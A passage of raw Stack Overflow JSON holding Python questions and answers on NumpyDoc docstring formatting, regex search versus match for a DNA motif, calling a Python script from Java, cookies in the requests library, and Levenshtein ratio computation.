wavelengths: 0.900 - 2.100 um  &amp;  x: 0.3 - 1.0\n\nCalculated by sellmeier equation, with params from\n\n  M. J. Mondry, D. I. Babic, J. E. Bowers, and L. A. Coldren,\n  \"Refractive indexes of (Al,Ga,In)As epilayers on InP for optoelectronic\n  applications,\" Phot. Tech. Lett., vol. 4, no. 6, pp. 627-630, 1992\n\nParameters\n----------\nx: float\n    Mole ratio of Al, as in: Al(x) Ga(1-x) In(1-x-y) As.  Also varies In\n    slightly for lattice-matching.\n\nwl: float\n    wavelength in microns.\n\n'''\n</code></pre>\n\n<p>The only thing I did was to broke your (very) long lines at 79 columns. Maybe that's a limitation of Sphinx (the library we use to render docstrings).</p>\n\n<p><em>Note</em>: Spyder 2.1.11 is ancient old!! Please try to update to our latest version, which is 2.3.4. </p>\n"}], "owner": {"reputation": 4741, "user_id": 2453202, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/e606i.jpg?s=128&g=1", "display_name": "Demis", "link": "https://stackoverflow.com/users/2453202/demis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "accepted_answer_id": 29636242, "answer_count": 1, "score": 1, "last_activity_date": 1579581305, "creation_date": 1427928723, "last_edit_date": 1579581305, "question_id": 29402225, "link": "https://stackoverflow.com/questions/29402225/numpydoc-how-are-tabs-parsed", "title": "NumpyDoc: How are tabs parsed?", "body": "<p>I'm using the Spyder IDE (v.2.1.11 on Mac OS) and writing some code, and in writing a DocString (NumpyDoc format) for a function, can't figure out why the Spyder <em>Object Inspector</em> formats an indented line in this strange way.</p>\n\n<p>For a Docstring like the one below, the paper reference after \"<em>Calc'd by sellmeier...</em>\" <strong>is indented</strong>, which causes the strange behaviour:</p>\n\n<pre><code>def AlInGaAs(x, wl):\n'''\nReturns the refractive index of ~Al(x)Ga(1-x)In(1-x-y)As (lattice-matched to InP) at the specified wavelength, wl (in microns) and Aluminum content (x=0.0-1.0).  \n\nFor lattice-matching, the actual mole ratio, x, is defined as so:\nInP-matched X: (Al48 In52 As)_X --&gt; (Ga47 In53 As)_1-X\n\nValid for wavelengths: 0.900 - 2.100 um  &amp;  x: 0.3 - 1.0\n\nCalc'd by sellmeier equation, with params from\n    M. J. Mondry, D. I. Babic, J. E. Bowers, and L. A. Coldren, \"Refractive indexes of (Al,Ga,In)As epilayers on InP for optoelectronic applications,\" Phot. Tech. Lett., vol. 4, no. 6, pp. 627-630, 1992\n\nParameters\n----------\nx: float\n    Mole ratio of Al, as in: Al(x) Ga(1-x) In(1-x-y) As.  Also varies In slightly for lattice-matching.\n\nwl: float\n    wavelength in microns.\n\n...\n\n'''\n</code></pre>\n\n<p>The above DocString produces the following output (screenshot of the Spyder \"Object Inspector\"/help panel), with the unexpected <strong>bolding</strong> &amp; indentation/list numbers on the \"<em>M. J. Mondry, D. I. Babic...</em>\" text:</p>\n\n<p><img src=\"https://i.stack.imgur.com/lEnwb.png\" alt=\"Strange indentation and listing of the Paper Reference.\"></p>\n\n<p>While removing the indent, as so:</p>\n\n<pre><code>def AlInGaAs(x, wl):\n'''\nReturns the refractive index of ~Al(x)Ga(1-x)In(1-x-y)As (lattice-matched to InP) at the specified wavelength, wl (in microns) and Aluminum content (x=0.0-1.0).  \n\nFor lattice-matching, the actual mole ratio, x, is defined as so:\nInP-matched X: (Al48 In52 As)_X --&gt; (Ga47 In53 As)_1-X\n\nValid for wavelengths: 0.900 - 2.100 um  &amp;  x: 0.3 - 1.0\n\nCalc'd by sellmeier equation, with params from\n*** INDENT REMOVED BELOW ***\nM. J. Mondry, D. I. Babic, J. E. Bowers, and L. A. Coldren, \"Refractive indexes of (Al,Ga,In)As epilayers on InP for optoelectronic applications,\" Phot. Tech. Lett., vol. 4, no. 6, pp. 627-630, 1992\n\nParameters\n----------\nx: float\n    Mole ratio of Al, as in: Al(x) Ga(1-x) In(1-x-y) As.  Also varies In slightly for lattice-matching.\n\nwl: float\n    wavelength in microns.\n\n...\n\n'''\n</code></pre>\n\n<p>Looks normal, as so:</p>\n\n<p><img src=\"https://i.stack.imgur.com/7Uw3K.png\" alt=\"Object Inspector with un-Indented paper reference\"></p>\n\n<p>Is that just a bug in Spyder, or some other intended use of indenting?  How is one supposed to use (or not use) indents to produce various types of formatting in the Spyder IDE (which I assume is NumpyDoc format)?<br>\nI don't see any discussion of indentation and automatic lists on the <a href=\"https://github.com/numpy/numpy/blob/master/doc/HOWTO_DOCUMENT.rst.txt#docstring-standard\" rel=\"nofollow noreferrer\">NumpyDoc Documentation Page</a>.</p>\n\n<p>Just wondering if there's some useful undocumented DocString functionality I could be taking advantage of here.\n(On another note, I do notice that I could use the \"References\" section in the DocString, which I will move the Ref into at some point.)</p>\n\n<p>Thanks!</p>\n\n<p><em>My versions are as follows:\nSpyder v2.1.11, \nPython 2.7.6, Qt 4.8.4, PyQt4 (API v2) 4.9.6 on Darwin, \nMac OS 10.10.2</em></p>\n"}, {"tags": ["python", "regex"], "comments": [{"owner": {"reputation": 2289, "user_id": 1664675, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e9526be62369d44940cded06d9b1f7f8?s=128&d=identicon&r=PG", "display_name": "letsc", "link": "https://stackoverflow.com/users/1664675/letsc"}, "edited": false, "score": 0, "creation_date": 1427928731, "post_id": 29402209, "comment_id": 46979921, "body": "can your post your test case?"}, {"owner": {"reputation": 89, "user_id": 3472351, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/100003202488092/picture?type=large", "display_name": "user3472351", "link": "https://stackoverflow.com/users/3472351/user3472351"}, "reply_to_user": {"reputation": 2289, "user_id": 1664675, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e9526be62369d44940cded06d9b1f7f8?s=128&d=identicon&r=PG", "display_name": "letsc", "link": "https://stackoverflow.com/users/1664675/letsc"}, "edited": false, "score": 0, "creation_date": 1427928792, "post_id": 29402209, "comment_id": 46979939, "body": "do you mean the sequence that i&#39;m searching? it&#39;s really long... like more than 1000 chars"}, {"owner": {"reputation": 1546, "user_id": 4410674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9fb4899e4d5ddf6c49930f0b4161af21?s=128&d=identicon&r=PG&f=1", "display_name": "Nick Bailey", "link": "https://stackoverflow.com/users/4410674/nick-bailey"}, "edited": false, "score": 0, "creation_date": 1427928806, "post_id": 29402209, "comment_id": 46979943, "body": "What happens when you hard code the patterns?"}, {"owner": {"reputation": 2289, "user_id": 1664675, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e9526be62369d44940cded06d9b1f7f8?s=128&d=identicon&r=PG", "display_name": "letsc", "link": "https://stackoverflow.com/users/1664675/letsc"}, "edited": false, "score": 0, "creation_date": 1427928829, "post_id": 29402209, "comment_id": 46979956, "body": "Just a small portion of it should be good enough."}, {"owner": {"reputation": 89, "user_id": 3472351, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/100003202488092/picture?type=large", "display_name": "user3472351", "link": "https://stackoverflow.com/users/3472351/user3472351"}, "edited": false, "score": 0, "creation_date": 1427928942, "post_id": 29402209, "comment_id": 46979992, "body": "&#39;GATCCTCCATATACAACGGTATCTCCACCTCAGGTTTAGATCTCAACAACGGAACCATT&zwnj;&#8203;GCCGACATGAGACAGTTAGG&zwnj;&#8203;TATCGTCGAGAGTTACAAGC&zwnj;&#8203;&#39;"}, {"owner": {"reputation": 21605, "user_id": 1142167, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/f9MAS.jpg?s=128&g=1", "display_name": "Joel Cornett", "link": "https://stackoverflow.com/users/1142167/joel-cornett"}, "edited": false, "score": 2, "creation_date": 1427929465, "post_id": 29402209, "comment_id": 46980159, "body": "I think you mean <code>&#39;*&#39; -&gt; &#39;.*?&#39;</code> for 0 or more"}], "answers": [{"tags": [], "owner": {"reputation": 286, "user_id": 1390062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5142baf94a8f8065f36c6fe86319448c?s=128&d=identicon&r=PG", "display_name": "geoelectric", "link": "https://stackoverflow.com/users/1390062/geoelectric"}, "is_accepted": false, "score": 1, "last_activity_date": 1427928994, "creation_date": 1427928994, "answer_id": 29402266, "question_id": 29402209, "link": "https://stackoverflow.com/questions/29402209/python-use-string-variable-as-search-pattern-in-regex/29402266#29402266", "title": "Python: use string variable as search pattern in regex", "body": "<p><code>re.match()</code> only matches at the beginning of the sequence. Perhaps you need <code>re.search()</code>?</p>\n\n<pre><code>&gt;&gt;&gt; re.match(r'{0}'.format('bar'), 'foobar').group(0)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt; \nAttributeError: 'NoneType' object has no attribute 'group'\n&gt;&gt;&gt; re.search(r'{0}'.format('bar'), 'foobar').group(0)\n'bar'\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 89, "user_id": 3472351, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/100003202488092/picture?type=large", "display_name": "user3472351", "link": "https://stackoverflow.com/users/3472351/user3472351"}, "edited": false, "score": 0, "creation_date": 1427929215, "post_id": 29402268, "comment_id": 46980078, "body": "thanks, that works. will accept your answer when stackoverflow allows me to do so :) (in six minutes for some reason)"}], "tags": [], "owner": {"reputation": 79972, "user_id": 298607, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/DVW9g.jpg?s=128&g=1", "display_name": "dawg", "link": "https://stackoverflow.com/users/298607/dawg"}, "is_accepted": true, "score": 2, "last_activity_date": 1449793879, "last_edit_date": 1449793879, "creation_date": 1427929001, "answer_id": 29402268, "question_id": 29402209, "link": "https://stackoverflow.com/questions/29402209/python-use-string-variable-as-search-pattern-in-regex/29402268#29402268", "title": "Python: use string variable as search pattern in regex", "body": "<p>That should work fine:</p>\n\n<pre><code>&gt;&gt;&gt; tgt='AGAGAGAGACGTACACAC'\n&gt;&gt;&gt; re.match(r'{}'.format('ACGT'), tgt)\n&gt;&gt;&gt; re.search(r'{}'.format('ACGT'), tgt)\n&lt;_sre.SRE_Match object at 0x10a5d6920&gt;\n</code></pre>\n\n<p>I think it may because you mean to use search vs match</p>\n\n<hr>\n\n<p>Hint on your posted code:</p>\n\n<pre><code>prompt='''\\\n    Enter a motif to search for it in the sequence \n    (The wildcard character '?' represents any nucleotide in that position, \n     and * represents none or many nucleotides in that position.)\n'''\npattern=None\nwhile pattern==None:\n    print prompt\n    user_input=raw_input('&gt;&gt;&gt; ')\n    letterlist = ['A','C','G','T', '?', '*']\n    user_input=user_input.upper()\n    if len(user_input)&gt;1 and all(c in letterlist for c in user_input):\n        pattern=user_input.replace('?', '.').replace('*', '.*?')\n    else:\n        print 'Bad pattern, please try again'\n</code></pre>\n"}], "owner": {"reputation": 89, "user_id": 3472351, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/100003202488092/picture?type=large", "display_name": "user3472351", "link": "https://stackoverflow.com/users/3472351/user3472351"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 284, "favorite_count": 0, "accepted_answer_id": 29402268, "answer_count": 2, "score": 0, "last_activity_date": 1449793879, "creation_date": 1427928664, "last_edit_date": 1427929044, "question_id": 29402209, "link": "https://stackoverflow.com/questions/29402209/python-use-string-variable-as-search-pattern-in-regex", "title": "Python: use string variable as search pattern in regex", "body": "<p>I'm trying to search a nucleotide sequence (composed of only A,C,G,T) for a user-defined pattern, using regex:</p>\n\n<p>The relevant code is as follows:</p>\n\n<pre><code>    match = re.match(r'{0}'.format(pattern), sequence)\n</code></pre>\n\n<p>match always returns None, where I need it to return the part of the sequence that matches the user query...</p>\n\n<p>What am I doing wrong?</p>\n\n<p>EDIT: This is how I constructed the search pattern:</p>\n\n<pre><code>   askMotif = raw_input('Enter a motif to search for it in the sequence (The wildcard character \u2018?\u2019 represents any nucleotide in that position, and * represents none or many nucleotides in that position.): ')\nlistMotif= []    \nletterlist = ['A','C','G','T', 'a', 'c','g','t']\nfor letter in askMotif:\n    if letter in letterlist:\n        a = letter.capitalize()\n        listMotif.append(a)\n    if letter == '?':\n        listMotif.append('.')\n    if letter == '*':\n        listMotif.append('*?')\npattern = ''\nfor searcher in listMotif:\n    pattern+=searcher\n</code></pre>\n\n<p>Not very pythonic, I know...</p>\n"}, {"tags": ["java", "python", "runtime.exec"], "comments": [{"owner": {"reputation": 120590, "user_id": 3788176, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/9c18d321d8948803c05643d87b003dc2?s=128&d=identicon&r=PG&f=1", "display_name": "Andy Turner", "link": "https://stackoverflow.com/users/3788176/andy-turner"}, "edited": false, "score": 0, "creation_date": 1427928495, "post_id": 29402141, "comment_id": 46979847, "body": "You&#39;ll get a <code>NullPointerException</code>, since <code>process</code> is <code>null</code> when you call <code>process.getOutputStream()</code>."}, {"owner": {"reputation": 187, "user_id": 3504042, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1131593978/picture?type=large", "display_name": "JamesF", "link": "https://stackoverflow.com/users/3504042/jamesf"}, "reply_to_user": {"reputation": 120590, "user_id": 3788176, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/9c18d321d8948803c05643d87b003dc2?s=128&d=identicon&r=PG&f=1", "display_name": "Andy Turner", "link": "https://stackoverflow.com/users/3788176/andy-turner"}, "edited": false, "score": 0, "creation_date": 1427928744, "post_id": 29402141, "comment_id": 46979925, "body": "Sorry, I uploaded the wrong edit. Have edited question"}, {"owner": {"reputation": 120590, "user_id": 3788176, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/9c18d321d8948803c05643d87b003dc2?s=128&d=identicon&r=PG&f=1", "display_name": "Andy Turner", "link": "https://stackoverflow.com/users/3788176/andy-turner"}, "edited": false, "score": 0, "creation_date": 1427928983, "post_id": 29402141, "comment_id": 46980006, "body": "possible duplicate of <a href=\"http://stackoverflow.com/questions/14533954/java-runtime-exec-arguments-on-linux\">Java Runtime.exec() arguments on Linux</a>"}, {"owner": {"reputation": 100768, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "edited": false, "score": 0, "creation_date": 1427929057, "post_id": 29402141, "comment_id": 46980028, "body": "How do you know that the script is not called? (please be specific when describing the command you try to run). What happens instead?"}, {"owner": {"reputation": 120590, "user_id": 3788176, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/9c18d321d8948803c05643d87b003dc2?s=128&d=identicon&r=PG&f=1", "display_name": "Andy Turner", "link": "https://stackoverflow.com/users/3788176/andy-turner"}, "edited": false, "score": 0, "creation_date": 1427929110, "post_id": 29402141, "comment_id": 46980040, "body": "Also, as suggested in a comment on the duplicate question, consider using <code>ProcessBuilder</code>."}, {"owner": {"reputation": 100768, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "edited": false, "score": 0, "creation_date": 1427929562, "post_id": 29402141, "comment_id": 46980187, "body": "<code>exec(String)</code> should never be used, but this is not a problem with arguments. It&#39;s probably either because the program is outputting something that&#39;s not being read, or because there&#39;s a problem with the command being executed."}, {"owner": {"reputation": 187, "user_id": 3504042, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1131593978/picture?type=large", "display_name": "JamesF", "link": "https://stackoverflow.com/users/3504042/jamesf"}, "edited": false, "score": 0, "creation_date": 1427929886, "post_id": 29402141, "comment_id": 46980288, "body": "There is no problem with the command being executed as it works perfectly when I exe it manually. ie, go into term and type &quot;python pythonycsbcommand.py&quot;."}, {"owner": {"reputation": 187, "user_id": 3504042, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1131593978/picture?type=large", "display_name": "JamesF", "link": "https://stackoverflow.com/users/3504042/jamesf"}, "edited": false, "score": 0, "creation_date": 1427930828, "post_id": 29402141, "comment_id": 46980621, "body": "As far as I can tell, the java does absolutely nothing because I can put a path that does not exist and it will still execute with 0 error"}, {"owner": {"reputation": 3757, "user_id": 5033247, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lcqj4.jpg?s=128&g=1", "display_name": "Smart Manoj", "link": "https://stackoverflow.com/users/5033247/smart-manoj"}, "edited": false, "score": 0, "creation_date": 1552316103, "post_id": 29402141, "comment_id": 96952043, "body": "Working fine ; Tried with pymsgbox"}], "owner": {"reputation": 187, "user_id": 3504042, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1131593978/picture?type=large", "display_name": "JamesF", "link": "https://stackoverflow.com/users/3504042/jamesf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 422, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1427931407, "creation_date": 1427928327, "last_edit_date": 1427931407, "question_id": 29402141, "link": "https://stackoverflow.com/questions/29402141/java-runtime-exec-python-not-calling-python-script", "title": "java Runtime.exec python not calling python script", "body": "<p>I am trying to invoke a python script from java. The java compiles fine but the python script is not called.</p>\n\n<pre><code>public class javaToPython{\n\n\npublic static void main(String[] args) throws InterruptedException {\n try {      \nRuntime runtime = Runtime.getRuntime();\nProcess process;\n\n\n       process = runtime.exec(\"python /home/james/YCSB/bin/pythonycsbcommand.py \");\n\n\nprocess.waitFor();\n       } \n catch (IOException ex) {\n       Logger.getLogger(javaToPython.class.getName()).log(Level.SEVERE, null, ex);\n   }\n   }\n}\n</code></pre>\n\n<p>python script:</p>\n\n<pre><code>import os\n\nfo = open(\"/home/james/YCSB/bin/command.txt\", \"r+\")\nstr = fo.read()\n\nprint \"\", str\n\nfo.close()\n\nos.system(str)\n</code></pre>\n\n<p>Edit:</p>\n\n<p>I have tried using the process builder but again with the same results.</p>\n\n<pre><code>ProcessBuilder pb = new ProcessBuilder(\"python\", \"/home/james/YCSB/bin/script.py\", \"-m 2\");\nProcess p = pb.start();\n</code></pre>\n\n<p>I have tried entering a path that does not exist but the java script still compiles. </p>\n"}, {"tags": ["python", "request"], "answers": [{"comments": [{"owner": {"reputation": 69, "user_id": 1678792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mkBsZ.jpg?s=128&g=1", "display_name": "Max Lin", "link": "https://stackoverflow.com/users/1678792/max-lin"}, "edited": false, "score": 0, "creation_date": 1428002924, "post_id": 29409376, "comment_id": 47013546, "body": "Thanks for your info. This is all the code I wrote, is it possible that server just put cookie in send request instead of response ? Because I expect getting it from response."}, {"owner": {"reputation": 5257, "user_id": 3946766, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a53461a9198ab5365f72c744a83ff3b?s=128&d=identicon&r=PG", "display_name": "matsjoyce", "link": "https://stackoverflow.com/users/3946766/matsjoyce"}, "reply_to_user": {"reputation": 69, "user_id": 1678792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mkBsZ.jpg?s=128&g=1", "display_name": "Max Lin", "link": "https://stackoverflow.com/users/1678792/max-lin"}, "edited": false, "score": 0, "creation_date": 1428008474, "post_id": 29409376, "comment_id": 47016266, "body": "@MaxLin No, as the sent cookies are handled exclusively by the requests code <i>before</i> the send, so I don&#39;t think cross-contamination is possible. Does this happen with requests to other servers?"}], "tags": [], "owner": {"reputation": 5257, "user_id": 3946766, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a53461a9198ab5365f72c744a83ff3b?s=128&d=identicon&r=PG", "display_name": "matsjoyce", "link": "https://stackoverflow.com/users/3946766/matsjoyce"}, "is_accepted": false, "score": 3, "last_activity_date": 1427966600, "creation_date": 1427966600, "answer_id": 29409376, "question_id": 29402106, "link": "https://stackoverflow.com/questions/29402106/python-request-module-not-getting-cookie-from-response/29409376#29409376", "title": "Python Request module not getting cookie from response", "body": "<p>The <code>r.cookies</code> jar contains all cookies that are new, that the server has sent in the current response, so any cookies that have been sent will not appear there unless the server resent them. The sent cookies will appear in <code>r.request.headers</code> (the jar is at <code>r.request._cookies</code>). If you want to preserve the cookies across multiple requests, use a <a href=\"http://docs.python-requests.org/en/latest/api/#requests.Session\" rel=\"nofollow\"><code>Session</code></a>:</p>\n\n<pre><code>session = requests.Session()\nsession.get(...)  # Your first request\nsession.get(...)  # Following requests pass the cookies on\n</code></pre>\n\n<p>While using the session, you can retrieve any cookies by looking in <code>session.cookies</code>. I don't know why you saw cookies sent when you didn't, I'd have to see more code.</p>\n"}], "owner": {"reputation": 69, "user_id": 1678792, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mkBsZ.jpg?s=128&g=1", "display_name": "Max Lin", "link": "https://stackoverflow.com/users/1678792/max-lin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4272, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1427966674, "creation_date": 1427928137, "last_edit_date": 1427966674, "question_id": 29402106, "link": "https://stackoverflow.com/questions/29402106/python-request-module-not-getting-cookie-from-response", "title": "Python Request module not getting cookie from response", "body": "<p>I'm writing code trying to get Cookies from webserver using Request module, but what confused me is that:</p>\n\n<ol>\n<li>I'm seeing Cookies returned when I tested using PostMan - REST Client</li>\n<li>I didn't sent any cookies in my sent request, but what surprised me is that could find the cookie I want in Sent requests.</li>\n</ol>\n\n<p>I want to get cookie data that I could use in code to request another application.</p>\n\n<p>Following is my code:</p>\n\n<pre><code>import requests\nimport urllib3.contrib.pyopenssl\nurllib3.contrib.pyopenssl.inject_into_urllib3()\n\nusername = 'user123'  # real username/password not showing\npassword = '1234567'\n\nlogin_data = {'id':username, 'pass_word':password, 'action': 'login'}\n\nr = requests.post(\"www.example.com/login/\", data=login_data)\n\nprint r.cookies \nprint r.request.header['Cookie']\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>&lt;&lt;class 'requests.cookies.RequestsCookieJar'&gt;[]&gt;   # why nothing??\n\n{'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.6.0 CPython/2.7.6 Darwin/14.1.0', 'Connection': 'keep-alive', 'Cookie': 'blahblahblahblah', 'Content-Type': 'application/x-www-form-urlencoded'}\n</code></pre>\n\n<p>For confidential reason, I cannot show my real cookies data here, but I do see it's in my send request, how come? I didn't tell it to send it in my request, and this is the data that i expect to get from response cookie, but it showed as none.</p>\n"}, {"tags": ["python", "levenshtein-distance"], "comments": [{"owner": {"reputation": 23058, "user_id": 1599111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e3147a010e5a5d4796739e9a3a47ad2?s=128&d=identicon&r=PG", "display_name": "Lukas Graf", "link": "https://stackoverflow.com/users/1599111/lukas-graf"}, "edited": false, "score": 1, "creation_date": 1427927769, "post_id": 29402027, "comment_id": 46979600, "body": "So why didn&#39;t you update your <a href=\"http://stackoverflow.com/questions/29401904/how-is-levenshtein-distance-related-to-ratio\">original question from 12min ago</a> with details to what&#39;s still unclear?"}, {"owner": {"reputation": 11566, "user_id": 1262820, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mq3Cq.png?s=128&g=1", "display_name": "felipsmartins", "link": "https://stackoverflow.com/users/1262820/felipsmartins"}, "edited": false, "score": 0, "creation_date": 1427927909, "post_id": 29402027, "comment_id": 46979656, "body": "May be you want have a look in: <a href=\"http://stackoverflow.com/questions/6690739/fuzzy-string-comparison-in-python-confused-with-which-library-to-use\" title=\"fuzzy string comparison in python confused with which library to use\">stackoverflow.com/questions/6690739/&hellip;</a>"}, {"owner": {"reputation": 96308, "user_id": 651174, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2e2d79b9350ef4ebf04ac0ad5816a5c3?s=128&d=identicon&r=PG", "display_name": "David542", "link": "https://stackoverflow.com/users/651174/david542"}, "reply_to_user": {"reputation": 11566, "user_id": 1262820, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mq3Cq.png?s=128&g=1", "display_name": "felipsmartins", "link": "https://stackoverflow.com/users/1262820/felipsmartins"}, "edited": false, "score": 0, "creation_date": 1427928057, "post_id": 29402027, "comment_id": 46979708, "body": "@felipsmartins -- I&#39;ve also added the output from <code>difflib</code>."}, {"owner": {"reputation": 21133, "user_id": 1084416, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/RLhZZ.jpg?s=128&g=1", "display_name": "Peter Wood", "link": "https://stackoverflow.com/users/1084416/peter-wood"}, "edited": false, "score": 0, "creation_date": 1427928085, "post_id": 29402027, "comment_id": 46979721, "body": "possible duplicate of <a href=\"http://stackoverflow.com/questions/1471153/string-similarity-metrics-in-python\">String similarity metrics in Python</a>"}, {"owner": {"reputation": 23058, "user_id": 1599111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e3147a010e5a5d4796739e9a3a47ad2?s=128&d=identicon&r=PG", "display_name": "Lukas Graf", "link": "https://stackoverflow.com/users/1599111/lukas-graf"}, "edited": false, "score": 1, "creation_date": 1427929479, "post_id": 29402027, "comment_id": 46980164, "body": "So did you actually look at the accepted answer for the question that was linked as a duplicate to your <a href=\"http://stackoverflow.com/questions/29401904/how-is-levenshtein-distance-related-to-ratio\">first question</a>? <code>ratio()</code> uses a different cost for replace operations than <code>distance()</code>, hence the difference. <code>(lensum - ldist) &#47; lensum = (41.0 - 17.0) &#47; 41.0 = 0.585</code>"}, {"owner": {"reputation": 23058, "user_id": 1599111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e3147a010e5a5d4796739e9a3a47ad2?s=128&d=identicon&r=PG", "display_name": "Lukas Graf", "link": "https://stackoverflow.com/users/1599111/lukas-graf"}, "edited": false, "score": 0, "creation_date": 1427931203, "post_id": 29402027, "comment_id": 46980739, "body": "@David542 since the internal <code>levenshtein_common</code> C function isn&#39;t exposed at the Python level, it&#39;s not trivial to get at an <code>ldist</code> value with a <code>replace</code> cost of 2 to do the exact same calculation yourself. But you can look at <code>Levenshtein.editops(a, b)</code> and see that there are 5 <code>replace</code> operations (<code>17 - 12</code>) to verify that that&#39;s where the discrepancy comes from."}, {"owner": {"reputation": 96308, "user_id": 651174, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2e2d79b9350ef4ebf04ac0ad5816a5c3?s=128&d=identicon&r=PG", "display_name": "David542", "link": "https://stackoverflow.com/users/651174/david542"}, "reply_to_user": {"reputation": 23058, "user_id": 1599111, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e3147a010e5a5d4796739e9a3a47ad2?s=128&d=identicon&r=PG", "display_name": "Lukas Graf", "link": "https://stackoverflow.com/users/1599111/lukas-graf"}, "edited": false, "score": 0, "creation_date": 1427931826, "post_id": 29402027, "comment_id": 46980902, "body": "@LukasGraf -- ok, great. I was able to figure out the issue with your help, and I&#39;ve added an answer below from your insights. Thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 96308, "user_id": 651174, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2e2d79b9350ef4ebf04ac0ad5816a5c3?s=128&d=identicon&r=PG", "display_name": "David542", "link": "https://stackoverflow.com/users/651174/david542"}, "is_accepted": true, "score": 3, "last_activity_date": 1427931782, "creation_date": 1427931782, "answer_id": 29402762, "question_id": 29402027, "link": "https://stackoverflow.com/questions/29402027/python-levenshtein-ratio-calculation/29402762#29402762", "title": "python-Levenshtein ratio calculation", "body": "<p>From Lukas's comment, the reason for this is that the <code>ratio()</code> uses a cost of <strong>2</strong> for replace operations rather than the normal cost of <strong>1</strong> for the Levenshtein distance. Here's an example calculation:</p>\n\n<pre><code>a = 'bjork gudmundsdottir'\nb = 'b. gudmundsson gunnar'\n\n&gt;&gt;&gt; Levenshtein.editops(a,b)\n[('delete', 1, 1), ('delete', 2, 1), ('delete', 3, 1), ('replace', 4, 1), ('replace', 14, 11), ('insert', 16, 13), ('insert', 16, 14), ('insert', 16, 15), ('insert', 16, 16), ('replace', 16, 17), ('replace', 17, 18), ('replace', 18, 19)]\n\n&gt;&gt;&gt; ldist = sum([2 for item in Levenshtein.editops(a,b) if item[0] == 'replace']) \n          + sum([1 for item in Levenshtein.editops(a,b) if item[0] != 'replace']) # 17\nln = len(a) + len(b) # 41\n\n&gt;&gt;&gt; (41.0-17.0)/41.0\n0.5853658536585366\n&gt;&gt;&gt; Levenshtein.ratio(a,b)\n0.5853658536585366\n</code></pre>\n"}], "owner": {"reputation": 96308, "user_id": 651174, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/2e2d79b9350ef4ebf04ac0ad5816a5c3?s=128&d=identicon&r=PG", "display_name": "David542", "link": "https://stackoverflow.com/users/651174/david542"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3395, "favorite_count": 1, "accepted_answer_id": 29402762, "answer_count": 1, "score": 1, "last_activity_date": 1427931782, "creation_date": 1427927632, "last_edit_date": 1495542759, "question_id": 29402027, "link": "https://stackoverflow.com/questions/29402027/python-levenshtein-ratio-calculation", "title": "python-Levenshtein ratio calculation", "body": "<p>I have the following two strings:</p>\n\n<pre><code>a = 'bjork gudmundsdottir'\nb = 'b. gudmundsson gunnar'\n</code></pre>\n\n<p>The Levenshtein distance between the two is <code>12</code>. When I use the following formula for Levenshtein distance, I get a discrepancy of <code>0.01</code> with the <code>python-Levenshtein</code> 